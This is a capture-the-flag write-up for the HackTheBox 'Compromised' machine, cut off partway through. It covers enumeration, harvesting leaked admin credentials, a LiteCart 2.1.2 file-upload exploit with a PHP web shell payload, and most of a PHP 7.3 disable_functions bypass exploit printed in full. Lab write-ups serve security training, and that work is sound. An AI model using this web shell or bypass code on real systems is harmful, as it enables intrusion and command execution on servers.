@@ -1,0 +1,901 @@
+I"òÚ<p><img src="/assets/img/htb-machines/compromised/1.png" alt="Desktop View" /></p>
+
+<hr />
+
+<p><strong><span style="color:#ff5555">Introduction</span></strong></p>
+
+<hr />
+
+<p>Compromised machine released on 12 Sep 2020 on Hackthebox and create by <a href="https://www.hackthebox.eu/home/users/profile/103781">D4nch3n</a></p>
+
+<p><span style="color:#ff5555">The blog is for educational purposes only.</span></p>
+
+<hr />
+
+<hr />
+
+<p><strong><span style="color:#ff5555">Enumeration</span></strong></p>
+
+<p><strong><span style="color:#ff5555">IP-: 10.10.10.207</span></strong></p>
+
+<p>As always, I added IP In hosts file.</p>
+
+<hr />
+
+<p><code class="language-plaintext highlighter-rouge">softwareuser@parrot:~ sudo nmap -sC -sS -sV -T4 -A -oN nmap/intial_scan compromised.htb </code></p>
+
+<p><img src="/assets/img/htb-machines/compromised/2.png" alt="Desktop View" /></p>
+
+<p><strong>-sC for default scripts</strong><br />
+<strong>-sV for Version detection</strong><br />
+<strong>-sS for SYN scan </strong><br />
+<strong>-T4 for speeding up Scan</strong><br />
+<strong>-A  for Advanced and Aggressive features</strong><br /> 
+<strong>-oN for Output</strong><br /></p>
+
+<p>lnmap is just my alias to print only open ports from result file</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+</pre></td></tr></tbody></table></code></pre></div></div>
+<hr />
+
+<p><strong><span style="color:#ff5555">Web-Page</span></strong></p>
+
+<hr />
+
+<p>Litecart is running on web page. LiteCart e-commerce platform built with PHP, jQuery and HTML 5.</p>
+
+<p><img src="/assets/img/htb-machines/compromised/main.png" alt="Desktop View" /></p>
+
+<p>Nothing intresting lets dir brute.</p>
+
+<p><code class="language-plaintext highlighter-rouge">gobuster dir -u compromised.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 | tee gobuster/gobuster.log </code></p>
+
+<p><img src="/assets/img/htb-machines/compromised/3.png" alt="Desktop View" /></p>
+
+<h1 id="directories">Directories</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td> --><td class="rouge-code"><pre>/.hta 
+/.htpasswd 
+/.htaccess 
+/backup 
+/index.php 
+/server-status 
+/shop 
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>in backup dir got an tar.gz file</p>
+
+<p><img src="/assets/img/htb-machines/compromised/4.png" alt="Desktop View" /></p>
+
+<p>Extracting tar file</p>
+
+<p><img src="/assets/img/htb-machines/compromised/5.png" alt="Desktop View" /></p>
+
+<p>Lots of file in extracted folder</p>
+
+<p><img src="/assets/img/htb-machines/compromised/6.png" alt="Desktop View" /></p>
+
+<p>after some enumeration i got file where we can see location of hidden log file  in /admin/login.php</p>
+
+<p>Login php -</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td> --><td class="rouge-code"><pre>if (isset($_POST['login'])) {
+    //file_put_contents("./.log2301c9430d8593ae.txt", "User: " . $_POST['username'] . " Passwd: " . $_POST['password']);
+    user::login($_POST['username'], $_POST['password'], $redirect_url, isset($_POST['remember_me']) ? $_POST['remember_me'] : false);
+}
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>file name - [./.log2301c9430d8593ae.txt]</p>
+
+<p>so i tried to access it on web page. We can access it on -:  (http://compromised.htb/shop/admin/.log2301c9430d8593ae.txt)</p>
+
+<p><img src="/assets/img/htb-machines/compromised/7.png" alt="Desktop View" /></p>
+
+<p>we got a password and username also on web page we have an login page we can try to login.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>User: admin Passwd: theNextGenSt0r3!~
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="/assets/img/htb-machines/compromised/main2.png" alt="Desktop View" /></p>
+
+<p>Logged in admin panel and in the bottom we can see version of web page</p>
+
+<p><img src="/assets/img/htb-machines/compromised/8.png" alt="Desktop View" /></p>
+
+<p><strong><span style="color:#ff5555">LiteCart 2.1.2</span></strong></p>
+
+<p>Searching exploit of LiteCart Version by searchsploit</p>
+
+<p><img src="/assets/img/htb-machines/compromised/9.png" alt="Desktop View" /></p>
+
+<p>now we can exploit litecart. Run the exploit</p>
+
+<p><code class="language-plaintext highlighter-rouge">python 45267.py -t http://10.10.10.207/shop/admin/ -p 'theNextGenSt0r3!~' -u admin</code></p>
+
+<p>got noting we probably need to edit the script</p>
+
+<p>edit exploit code so we can see php version -</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td> --><td class="rouge-code"><pre>files = {
+        'vqmod': (rand + ".php", "&lt;?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2&gt;&amp;1' ); } ?&gt;", "application/xml"),
+        'token':one,
+        'upload':(None,"Upload")
+    }
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td> --><td class="rouge-code"><pre>to this 
+`files = {
+        'vqmod': (rand + ".php", "&lt;?php phpinfo(); ?&gt;", "application/xml"),
+        'token':one,
+        'upload':(None,"Upload")
+}
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>also remove print r.content from line72</p>
+
+<p>run the exploit now and our shell is uploaded</p>
+
+<p><img src="/assets/img/htb-machines/compromised/10.png" alt="Desktop View" /></p>
+
+<p>now we can see php versionin disablefunctions we can see a lot functions we canâ€™t execute</p>
+
+<p><img src="/assets/img/htb-machines/compromised/main3.png" alt="Desktop View" /></p>
+
+<p>and the php version is vunlreable and there is an bypass available <a href="https://packetstormsecurity.com/files/154728/PHP-7.3-disable_functions-Bypass.html">Link</a> we also need to modify python-exploit and bypass.php.</p>
+
+<p>edit bypass</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td> --><td class="rouge-code"><pre>to 
+pwn("uname -a");
+
+to this 
+pwn("c")
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>so final exploit and bypass will be</p>
+
+<p>mybypass.php</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+178
+179
+180
+181
+182
+183
+184
+185
+186
+187
+188
+189
+190
+191
+192
+193
+194
+195
+196
+197
+198
+199
+200
+201
+202
+203
+204
+205
+206
+207
+208
+209
+</pre></td> --><td class="rouge-code"><pre>
+<span class="cp">&lt;?php</span>
+<span class="nf">pwn</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'c'</span><span class="p">]);</span>
+
+<span class="k">function</span> <span class="n">pwn</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">global</span> <span class="nv">$abc</span><span class="p">,</span> <span class="nv">$helper</span><span class="p">;</span>
+
+    <span class="k">function</span> <span class="n">str2ptr</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$s</span> <span class="o">=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$address</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="k">for</span><span class="p">(</span><span class="nv">$j</span> <span class="o">=</span> <span class="nv">$s</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span> <span class="nv">$j</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$j</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$address</span> <span class="o">&lt;&lt;=</span> <span class="mi">8</span><span class="p">;</span>
+            <span class="nv">$address</span> <span class="o">|=</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$str</span><span class="p">[</span><span class="nv">$p</span><span class="o">+</span><span class="nv">$j</span><span class="p">]);</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="nv">$address</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">ptr2str</span><span class="p">(</span><span class="nv">$ptr</span><span class="p">,</span> <span class="nv">$m</span> <span class="o">=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$out</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
+        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$m</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$out</span> <span class="mf">.</span><span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nv">$ptr</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">);</span>
+            <span class="nv">$ptr</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="nv">$out</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">write</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$p</span><span class="p">,</span> <span class="nv">$v</span><span class="p">,</span> <span class="nv">$n</span> <span class="o">=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$n</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$str</span><span class="p">[</span><span class="nv">$p</span> <span class="o">+</span> <span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nv">$v</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">);</span>
+            <span class="nv">$v</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">leak</span><span class="p">(</span><span class="nv">$addr</span><span class="p">,</span> <span class="nv">$p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$s</span> <span class="o">=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">global</span> <span class="nv">$abc</span><span class="p">,</span> <span class="nv">$helper</span><span class="p">;</span>
+        <span class="nf">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="nv">$addr</span> <span class="o">+</span> <span class="nv">$p</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">);</span>
+        <span class="nv">$leak</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$helper</span><span class="o">-&gt;</span><span class="n">a</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$s</span> <span class="o">!=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$leak</span> <span class="o">%=</span> <span class="mi">2</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="nv">$s</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="p">}</span>
+        <span class="k">return</span> <span class="nv">$leak</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">parse_elf</span><span class="p">(</span><span class="nv">$base</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$e_type</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+
+        <span class="nv">$e_phoff</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
+        <span class="nv">$e_phentsize</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+        <span class="nv">$e_phnum</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+
+        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$e_phnum</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$header</span> <span class="o">=</span> <span class="nv">$base</span> <span class="o">+</span> <span class="nv">$e_phoff</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="nv">$e_phentsize</span><span class="p">;</span>
+            <span class="nv">$p_type</span>  <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
+            <span class="nv">$p_flags</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
+            <span class="nv">$p_vaddr</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
+            <span class="nv">$p_memsz</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">);</span>
+
+            <span class="k">if</span><span class="p">(</span><span class="nv">$p_type</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nv">$p_flags</span> <span class="o">==</span> <span class="mi">6</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># PT_LOAD, PF_Read_Write</span>
+                <span class="c1"># handle pie</span>
+                <span class="nv">$data_addr</span> <span class="o">=</span> <span class="nv">$e_type</span> <span class="o">==</span> <span class="mi">2</span> <span class="o">?</span> <span class="nv">$p_vaddr</span> <span class="o">:</span> <span class="nv">$base</span> <span class="o">+</span> <span class="nv">$p_vaddr</span><span class="p">;</span>
+                <span class="nv">$data_size</span> <span class="o">=</span> <span class="nv">$p_memsz</span><span class="p">;</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$p_type</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nv">$p_flags</span> <span class="o">==</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># PT_LOAD, PF_Read_exec</span>
+                <span class="nv">$text_size</span> <span class="o">=</span> <span class="nv">$p_memsz</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$data_addr</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$text_size</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$data_size</span><span class="p">)</span>
+            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+
+        <span class="k">return</span> <span class="p">[</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="nv">$text_size</span><span class="p">,</span> <span class="nv">$data_size</span><span class="p">];</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">get_basic_funcs</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="nv">$elf</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">list</span><span class="p">(</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="nv">$text_size</span><span class="p">,</span> <span class="nv">$data_size</span><span class="p">)</span> <span class="o">=</span> <span class="nv">$elf</span><span class="p">;</span>
+        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$data_size</span> <span class="o">/</span> <span class="mi">8</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$leak</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="nv">$i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
+            <span class="k">if</span><span class="p">(</span><span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&lt;</span> <span class="nv">$text_size</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$deref</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$leak</span><span class="p">);</span>
+                <span class="c1"># 'constant' constant check</span>
+                <span class="k">if</span><span class="p">(</span><span class="nv">$deref</span> <span class="o">!=</span> <span class="mh">0x746e6174736e6f63</span><span class="p">)</span>
+                    <span class="k">continue</span><span class="p">;</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="k">continue</span><span class="p">;</span>
+
+            <span class="nv">$leak</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
+            <span class="k">if</span><span class="p">(</span><span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&lt;</span> <span class="nv">$text_size</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$deref</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$leak</span><span class="p">);</span>
+                <span class="c1"># 'bin2hex' constant check</span>
+                <span class="k">if</span><span class="p">(</span><span class="nv">$deref</span> <span class="o">!=</span> <span class="mh">0x786568326e6962</span><span class="p">)</span>
+                    <span class="k">continue</span><span class="p">;</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="k">continue</span><span class="p">;</span>
+
+            <span class="k">return</span> <span class="nv">$data_addr</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">get_binary_base</span><span class="p">(</span><span class="nv">$binary_leak</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$base</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="nv">$start</span> <span class="o">=</span> <span class="nv">$binary_leak</span> <span class="o">&amp;</span> <span class="mh">0xfffffffffffff000</span><span class="p">;</span>
+        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mh">0x1000</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$addr</span> <span class="o">=</span> <span class="nv">$start</span> <span class="o">-</span> <span class="mh">0x1000</span> <span class="o">*</span> <span class="nv">$i</span><span class="p">;</span>
+            <span class="nv">$leak</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">7</span><span class="p">);</span>
+            <span class="k">if</span><span class="p">(</span><span class="nv">$leak</span> <span class="o">==</span> <span class="mh">0x10102464c457f</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># ELF header</span>
+                <span class="k">return</span> <span class="nv">$addr</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">get_system</span><span class="p">(</span><span class="nv">$basic_funcs</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$addr</span> <span class="o">=</span> <span class="nv">$basic_funcs</span><span class="p">;</span>
+        <span class="k">do</span> <span class="p">{</span>
+            <span class="nv">$f_entry</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$addr</span><span class="p">);</span>
+            <span class="nv">$f_name</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$f_entry</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>
+
+            <span class="k">if</span><span class="p">(</span><span class="nv">$f_name</span> <span class="o">==</span> <span class="mh">0x6d6574737973</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># system</span>
+                <span class="k">return</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$addr</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="nv">$addr</span> <span class="o">+=</span> <span class="mh">0x20</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="nv">$f_entry</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kd">class</span> <span class="nc">ryat</span> <span class="p">{</span>
+        <span class="k">var</span> <span class="nv">$ryat</span><span class="p">;</span>
+        <span class="k">var</span> <span class="nv">$chtg</span><span class="p">;</span>
+
+        <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span>
+        <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">chtg</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">ryat</span><span class="p">;</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">ryat</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="kd">class</span> <span class="nc">Helper</span> <span class="p">{</span>
+        <span class="k">public</span> <span class="nv">$a</span><span class="p">,</span> <span class="nv">$b</span><span class="p">,</span> <span class="nv">$c</span><span class="p">,</span> <span class="nv">$d</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="nb">stristr</span><span class="p">(</span><span class="kc">PHP_OS</span><span class="p">,</span> <span class="s1">'WIN'</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s1">'This PoC is for *nix systems only.'</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="nv">$n_alloc</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span> <span class="c1"># increase this value if you get segfaults</span>
+
+    <span class="nv">$contiguous</span> <span class="o">=</span> <span class="p">[];</span>
+    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$n_alloc</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
+        <span class="nv">$contiguous</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">str_repeat</span><span class="p">(</span><span class="s1">'A'</span><span class="p">,</span> <span class="mi">79</span><span class="p">);</span>
+
+    <span class="nv">$poc</span> <span class="o">=</span> <span class="s1">'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:"ryat":2:{s:4:"ryat";R:3;s:4:"chtg";i:2;}}i:1;i:3;i:2;R:5;}'</span><span class="p">;</span>
+    <span class="nv">$out</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$poc</span><span class="p">);</span>
+    <span class="nb">gc_collect_cycles</span><span class="p">();</span>
+
+    <span class="nv">$v</span> <span class="o">=</span> <span class="p">[];</span>
+    <span class="nv">$v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nf">ptr2str</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">79</span><span class="p">);</span>
+    <span class="nb">unset</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
+    <span class="nv">$abc</span> <span class="o">=</span> <span class="nv">$out</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">0</span><span class="p">];</span>
+
+    <span class="nv">$helper</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Helper</span><span class="p">;</span>
+    <span class="nv">$helper</span><span class="o">-&gt;</span><span class="n">b</span> <span class="o">=</span> <span class="k">function</span> <span class="p">(</span><span class="nv">$x</span><span class="p">)</span> <span class="p">{</span> <span class="p">};</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$abc</span><span class="p">)</span> <span class="o">==</span> <span class="mi">79</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"UAF failed"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="c1"># leaks</span>
+    <span class="nv">$closure_handlers</span> <span class="o">=</span> <span class="nf">str2ptr</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="nv">$php_heap</span> <span class="o">=</span> <span class="nf">str2ptr</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">);</span>
+    <span class="nv">$abc_addr</span> <span class="o">=</span> <span class="nv">$php_heap</span> <span class="o">-</span> <span class="mh">0xc8</span><span class="p">;</span>
+
+    <span class="c1"># fake value</span>
+    <span class="nf">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+    <span class="nf">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>
+
+    <span class="c1"># fake reference</span>
+    <span class="nf">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="nv">$abc_addr</span> <span class="o">+</span> <span class="mh">0x60</span><span class="p">);</span>
+    <span class="nf">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">);</span>
+
+    <span class="nv">$closure_obj</span> <span class="o">=</span> <span class="nf">str2ptr</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
+
+    <span class="nv">$binary_leak</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$closure_handlers</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$base</span> <span class="o">=</span> <span class="nf">get_binary_base</span><span class="p">(</span><span class="nv">$binary_leak</span><span class="p">)))</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"Couldn't determine binary base address"</span><span class="p">);</span>
+    <span class="p">}</span>
+
